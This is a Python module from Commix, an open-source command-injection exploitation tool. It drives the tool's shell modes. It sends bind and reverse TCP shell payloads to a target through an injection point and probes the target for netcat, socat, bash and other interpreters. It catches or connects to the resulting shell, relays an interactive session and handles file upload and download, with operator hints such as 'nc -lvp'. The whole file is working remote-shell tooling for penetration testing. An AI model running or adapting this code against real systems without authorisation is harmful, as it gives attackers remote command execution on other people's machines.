#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import socket
import time
import threading
from src.utils import common
from src.utils import settings
from src.core.shells import bind_tcp
from src.core.shells import modes
from src.core.shells import reverse_tcp
from src.core.shells import session_relay
from src.core.controller import checks

"""
Prompts [(b)ack/(q)uit], double-Ctrl-C-safe - shared by a launch/accept interrupt and the relay session's own.
"""
def back_or_quit_prompt(msg, filename, url):
  choice = "b"
  try:
    while True:
      choice = (common.read_input(msg, default="b", check_batch=False) or "b").strip().lower()
      if choice in ("b", "q"):
        break
      common.invalid_option(choice)
  except KeyboardInterrupt:
    # Erase it, or the next message overwrites the prompt and leaves its tail behind.
    settings.clear_current_line()
    choice = "q"
  if choice == "q":
    # Full teardown (logs notification, cleanups), not a bare SystemExit.
    checks.quit(filename, url, hard_exit=True)
  return None

"""
Runs execute_cmd(cmd) for a shell "run", offering (b)ack/(q)uit on Ctrl-C or a request timeout instead of crashing.
"""
def _execute_shell_launch(execute_cmd, cmd, filename, url):
  try:
    return execute_cmd(cmd)
  except (KeyboardInterrupt, SystemExit) as exc:
    settings.clear_current_line()
    if isinstance(exc, KeyboardInterrupt):
      msg = "Shell launch interrupted. [(b)ack/(q)uit] "
    else:
      msg = "Timed out - likely means the shell connected and is still open. [(b)ack/(q)uit] "
    return back_or_quit_prompt(msg, filename, url)

"""
Reports why a backgrounded payload send failed - its own output is suppressed, so this is the only place it surfaces.
"""
def _report_send_failure(send_result):
  if send_result.get("error"):
    err_msg = "Sending the payload failed: " + str(send_result["error"])
    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
  elif send_result.get("shell"):
    info_msg = "The target returned output for the payload (usually the interpreter's own error):"
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
    settings.print_data_to_stdout(settings.command_execution_output(send_result["shell"]))

"""
Reports a bind shell that never came up, plus whatever the backgrounded send has to say about it.
"""
def _report_bind_failure(send_result):
  err_msg = "Could not connect to " + settings.RHOST + ":" + settings.LPORT + " - the shell likely "
  err_msg += "did not start (missing binary/interpreter on the target, or the port is firewalled/unreachable)."
  settings.print_data_to_stdout(settings.print_error_msg(err_msg))
  _report_send_failure(send_result)

"""
Tries to connect to a just-launched bind shell, the only reliable way to know whether it came up.
Pass keep_open=True to get the connected socket back instead of a bool (for the built-in handler).
"""
def _probe_bind_connection(rhost, lport, retries=3, delay=1.5, timeout=3, keep_open=False):
  for attempt in range(retries):
    if attempt > 0:
      time.sleep(delay)
    try:
      sock = socket.create_connection((rhost, int(lport)), timeout=timeout)
      if keep_open:
        sock.settimeout(None)
        return sock
      sock.close()
      return True
    except Exception:
      continue
  return None if keep_open else False

"""
Checks whether something is already listening on LHOST:LPORT here - only a successful bind() means "no listener".
Pass keep_listening=True to get the bound+listening socket back instead of a bool (for the built-in handler).
"""
def _local_listener_active(lhost, lport, keep_listening=False):
  probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  probe.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1 if keep_listening else 0)
  bind_host = lhost if lhost not in ("", "0.0.0.0") else "0.0.0.0"
  try:
    probe.bind((bind_host, int(lport)))
    if keep_listening:
      probe.listen(1)
      return probe
    probe.close()
    return False
  except Exception:
    probe.close()
    return None if keep_listening else True

# Shell name -> the binary its payload needs on the target ("python" resolves its own interpreter).
_REQUIRED_BINARY = {
  "netcat/traditional": "nc.traditional",
  "netcat/busybox": "busybox",
  "netcat/openbsd": "nc",
  "php": "php",
  "perl": "perl",
  "ruby": "ruby",
  "socat": "socat",
  "ncat": "ncat",
  "bash": "bash",
}

"""
Checks the binary a payload needs is on the target - command substitution swallows "not found", so it would
otherwise fail silently. Returns False when the user would rather not send a payload that cannot work.
"""
def _binary_available(execute_cmd):
  binary = _REQUIRED_BINARY.get(settings.LAST_SELECTED_MODULE)
  if not binary:
    return True
  try:
    found = execute_cmd("command -v " + binary)
  except (Exception, SystemExit):
    return True
  if found and binary in str(found):
    return True
  err_msg = "Unable to find '" + binary + "' on the target."
  settings.print_data_to_stdout(settings.print_error_msg(err_msg))
  msg = "Do you want to send the payload anyway? [y/N] "
  return common.read_input(msg, default="N", check_batch=True) in settings.CHOICE_YES

"""
If HANDLER isn't already on (and the module even supports it), offers to turn it on for this run.
"""
def _maybe_prompt_for_handler():
  if settings.HANDLER or settings.LAST_SELECTED_MODULE.startswith(("meterpreter/", "web_delivery/")):
    return
  msg = "Do you want to use the built-in handler to catch this shell (instead of an external listener)? [y/N] "
  if common.read_input(msg, default="N", check_batch=True) in settings.CHOICE_YES:
    settings.HANDLER = True

"""
The shared loop behind both TCP modes: run the mode's prompt, then hand its payload to the
mode's own launch step until the mode is left.
"""
def _tcp_config_generic(mode_name, mode_options, launch, other_config, execute_cmd, cmd, go_back, go_back_again, filename, url, separator):
  flag, other_mode = modes.MODE_FLAGS[mode_name]
  setattr(settings, flag, True)

  while True:
    try:
      cmd = mode_options(separator, filename, url)
    except KeyboardInterrupt:
      checks.handle_exploitation_interrupt(filename, url)
      continue
    result = checks.check_tcp_mode_result(cmd, other_mode)
    if result != None:
      if result == 0:
        go_back_again = False
      elif result == 1 or result == 2:
        go_back_again = True
        setattr(settings, flag, False)
      elif result == 3:
        setattr(settings, flag, False)
        other_config(execute_cmd, cmd, go_back, go_back_again, filename, url, separator)
      return go_back, go_back_again

    if not _binary_available(execute_cmd):
      continue
    _maybe_prompt_for_handler()
    launch(cmd)

    info_msg = "Returning to the mode: '" + mode_name + "'."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))

"""
Configure the bind TCP shell, dispatching command execution through the given executor callback.
"""
def bind_tcp_config_generic(execute_cmd, cmd, go_back, go_back_again, filename, url, separator=""):
  # Send the payload and hand the connection over to the relay.
  def launch(cmd):
    send_result = {}
    threading.Thread(target=session_relay.run_payload_send, args=(execute_cmd, cmd, send_result), daemon=True).start()

    if settings.HANDLER and not settings.LAST_SELECTED_MODULE.startswith("meterpreter/"):
      info_msg = "Started bind TCP handler against " + settings.RHOST + ":" + settings.LPORT + "."
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))

      conn = _probe_bind_connection(settings.RHOST, settings.LPORT, keep_open=True)
      if conn:
        info_msg = "Session opened (" + settings.RHOST + ":" + settings.LPORT + ")."
        settings.print_data_to_stdout(settings.print_info_msg(info_msg))
        session_relay.interactive_relay(conn, filename, url)
      else:
        _report_bind_failure(send_result)
    else:
      info_msg = "Verifying the connection to " + settings.RHOST + ":" + settings.LPORT + "..."
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      if _probe_bind_connection(settings.RHOST, settings.LPORT):
        info_msg = "Connected. Use 'nc " + settings.RHOST + " " + settings.LPORT + "' to interact with the shell."
        settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      else:
        _report_bind_failure(send_result)

  return _tcp_config_generic("bind_tcp", bind_tcp.bind_tcp_options, launch, reverse_tcp_config_generic,
                             execute_cmd, cmd, go_back, go_back_again, filename, url, separator)

"""
Configure the reverse TCP shell, dispatching command execution through the given executor callback.
"""
def reverse_tcp_config_generic(execute_cmd, cmd, go_back, go_back_again, filename, url, separator=""):
  # Hand the connection to Metasploit, or to the built-in relay where it is not in use.
  def launch(cmd):
    if settings.HANDLER and not settings.LAST_SELECTED_MODULE.startswith(("meterpreter/", "web_delivery/")):
      server = _local_listener_active(settings.LHOST, settings.LPORT, keep_listening=True)
      if server is None:
        warn_msg = "Could not listen on " + settings.LHOST + ":" + settings.LPORT + " - either something is already "
        warn_msg += "bound there, or that address is not local to this host. Falling back to the external-listener workflow for this run."
        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
        shell = _execute_shell_launch(execute_cmd, cmd, filename, url)
        if shell:
          settings.print_data_to_stdout(settings.command_execution_output(shell))
      else:
        info_msg = "Started reverse TCP handler on " + settings.LHOST + ":" + settings.LPORT + "."
        settings.print_data_to_stdout(settings.print_info_msg(info_msg))
        server.settimeout(session_relay.ACCEPT_TIMEOUT)
        result = {}
        sender = threading.Thread(target=session_relay.run_payload_send, args=(execute_cmd, cmd, result), daemon=True)
        sender.start()
        try:
          try:
            conn, addr = server.accept()
          except socket.timeout:
            err_msg = "No connection observed back on " + settings.LHOST + ":" + settings.LPORT + " - the reverse "
            err_msg += "shell likely did not come back (target unreachable, missing interpreter on the target, or blocked egress)."
            settings.print_data_to_stdout(settings.print_error_msg(err_msg))
            _report_send_failure(result)
          except KeyboardInterrupt:
            back_or_quit_prompt("Waiting for the callback interrupted. [(b)ack/(q)uit] ", filename, url)
          else:
            info_msg = "Session opened (" + settings.LHOST + ":" + settings.LPORT
            info_msg += " -> " + str(addr[0]) + ":" + str(addr[1]) + ")."
            settings.print_data_to_stdout(settings.print_info_msg(info_msg))
            session_relay.interactive_relay(conn, filename, url)
        finally:
          server.close()
    else:
      # HANDLER on but still here means the shell needs its own listener, so say why.
      if settings.HANDLER:
        warn_msg = "The built-in handler cannot catch a '" + settings.LAST_SELECTED_MODULE + "' shell "
        warn_msg += "(it needs Metasploit's own handler). Using the external-listener workflow."
        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

      listener_was_active = _local_listener_active(settings.LHOST, settings.LPORT)
      if not listener_was_active:
        warn_msg = "No listener detected on " + settings.LHOST + ":" + settings.LPORT + ". "
        warn_msg += "Start one first (e.g. 'nc -lvp " + settings.LPORT + "') or the callback will be missed."
        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
      else:
        info_msg = "Check your external listener on " + settings.LHOST + ":" + settings.LPORT + " for the connection."
        settings.print_data_to_stdout(settings.print_info_msg(info_msg))

      send_result = {}
      threading.Thread(target=session_relay.run_payload_send, args=(execute_cmd, cmd, send_result), daemon=True).start()
      time.sleep(2)
      # Only catches a fast failure - a send still in flight is the normal case and reports nothing.
      if send_result.get("error"):
        err_msg = "Sending the payload failed: " + str(send_result["error"])
        settings.print_data_to_stdout(settings.print_error_msg(err_msg))

  return _tcp_config_generic("reverse_tcp", reverse_tcp.reverse_tcp_options, launch, bind_tcp_config_generic,
                             execute_cmd, cmd, go_back, go_back_again, filename, url, separator)

TCP_MODE_CONFIGS = {
  "bind_tcp": bind_tcp_config_generic,
  "reverse_tcp": reverse_tcp_config_generic,
}

"""
Check commix shell options, dispatching command execution through the given executor callback.
"""
def check_option_generic(execute_cmd, cmd, go_back, go_back_again, filename, url, separator=""):
  os_shell_option = checks.check_os_shell_options(cmd.lower(), filename, url)

  if os_shell_option == "back" or os_shell_option == True or os_shell_option == False:
    go_back = True
    if os_shell_option == False:
      go_back_again = True
    return go_back, go_back_again

  # The original "cmd" is used for the paths - "os_shell_option" is lowercased.
  elif os_shell_option and os_shell_option.split(" ", 1)[0] == "download":
    checks.shell_download(execute_cmd, cmd, filename)
    return go_back, go_back_again

  elif os_shell_option and os_shell_option.split(" ", 1)[0] == "upload":
    checks.shell_upload(execute_cmd, cmd)
    return go_back, go_back_again

  # Bare mode names no longer switch mode - "use <mode>" does (see below).
  elif os_shell_option in ("os_shell", "reverse_tcp", "bind_tcp"):
    err_msg = "Type 'use " + os_shell_option + "' to switch to that mode."
    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
    return go_back, go_back_again

  # "use os_shell" / "use bind_tcp" / "use reverse_tcp" - switch mode, mirroring the
  # "use payload <name>" flow inside the reverse_tcp/bind_tcp modes themselves.
  # os_shell_option is None for "?" (check_os_shell_options() prints the help itself
  # and returns nothing) - guard before slicing it.
  elif os_shell_option and (os_shell_option == "use" or os_shell_option[0:4] == "use "):
    use_target = os_shell_option[3:].strip()

    if use_target == "os_shell":
      warn_msg = "You are in the 'os_shell' mode."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
      return go_back, go_back_again

    elif use_target in TCP_MODE_CONFIGS:
      go_back, go_back_again = TCP_MODE_CONFIGS[use_target](execute_cmd, cmd, go_back, go_back_again, filename, url, separator)
      if not settings.BIND_TCP and not settings.REVERSE_TCP:
        info_msg = "Selected (default) mode: 'os_shell'."
        settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      return go_back, go_back_again

    else:
      common.invalid_option(cmd)
      return go_back, go_back_again

  # The "quit" / "exit" options
  elif os_shell_option == "quit" or os_shell_option == "exit":
    checks.quit(filename, url, hard_exit=True)

  else:
    return go_back, go_back_again

# eof
